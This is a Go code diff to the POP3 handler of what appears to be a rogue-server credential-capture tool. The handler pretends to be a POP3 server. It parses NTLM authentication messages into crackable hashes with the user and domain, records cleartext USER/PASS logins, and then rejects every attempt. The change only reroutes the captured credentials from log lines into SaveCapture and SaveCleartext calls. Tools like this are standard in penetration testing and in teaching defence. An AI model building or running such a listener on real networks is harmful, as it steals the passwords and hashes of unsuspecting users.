@@ -34,6 +34,7 @@ func HandlePOP3(c net.Conn) {
 	challenge := core.GetChallenge()
 	w := bufio.NewWriter(c)
 	r := bufio.NewReader(c)
+	pop3User := ""
 	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }
 
 	send("+OK POP3 server ready")
@@ -79,21 +80,19 @@ func HandlePOP3(c net.Conn) {
 			if len(ntlm3) >= 12 && core.NTLMMsgType(ntlm3) == 3 {
 				hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
 				if err == nil {
-					core.LogSuccess("[POP3] %s captured from %s", ntlmVer, c.RemoteAddr())
-					core.LogSuccess("       %s\\%s", domain, user)
-					core.LogSuccess("       %s", hash)
-					core.SaveHash(hash)
+					core.SaveCapture("POP3", c.RemoteAddr().String(), user, domain, ntlmVer, hash)
 				}
 			}
 			send("-ERR Authentication failed")
 			return
 
 		case strings.HasPrefix(upper, "USER "):
+			pop3User = strings.TrimSpace(line[5:])
 			send("+OK")
 		case strings.HasPrefix(upper, "PASS "):
 			pass := line[5:]
 			if pass != "" {
-				core.LogSuccess("[POP3] Cleartext from %s: pass=%q", c.RemoteAddr(), pass)
+				core.SaveCleartext("POP3", c.RemoteAddr().String(), pop3User, "", pass)
 			}
 			send("-ERR Authentication failed")
 			return
